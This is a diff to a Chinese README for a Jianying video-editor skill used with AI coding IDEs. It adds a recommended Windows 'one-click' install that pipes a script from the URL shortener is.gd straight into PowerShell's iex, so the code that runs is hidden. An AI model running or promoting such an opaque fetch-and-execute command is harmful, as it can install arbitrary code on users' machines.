@@ -12,8 +12,18 @@
 ## 🚀 快速开始 (Quick Start)
 
 ### 1. 安装 Skill (Install)
+建议优先使用 Windows 一键脚本，它会自动处理代码下载、目录结构和所有 Python 库。
 
-请根据您使用的 AI 编辑器 (IDE)，选择对应的安装命令，以确保 Skill 能被自动识别：
+**🔥 Windows Antigravity/trae/claude 用户一键全套（剪映skill+grok+Antigravity-api）自动安装 (推荐):**
+在 PowerShell 中运行：
+```powershell
+irm is.gd/rpb65M | iex
+```
+
+---
+
+**手动安装 (Manual Git Clone):**
+如果您是 Mac/Linux 用户或偏好手动操作，请参考以下对应 IDE 命令：
 
 **🤖 Antigravity / Gemini Code Assist:**
 ```bash
@@ -77,7 +87,7 @@ git clone https://github.com/luoluoluo22/jianying-editor-skill.git skills/jianyi
 请在终端运行以下命令以确保所有自动化功能正常工作：
 ```bash
 # 安装库：自动化导出、录屏监听、网页录制、AI 配音
-pip install uiautomation playwright pynput edge-tts
+pip install uiautomation playwright pynput edge-tts pymediainfo 
 
 # 初始化网页捕获环境 (Web-to-Video 功能必填)
 playwright install chromium
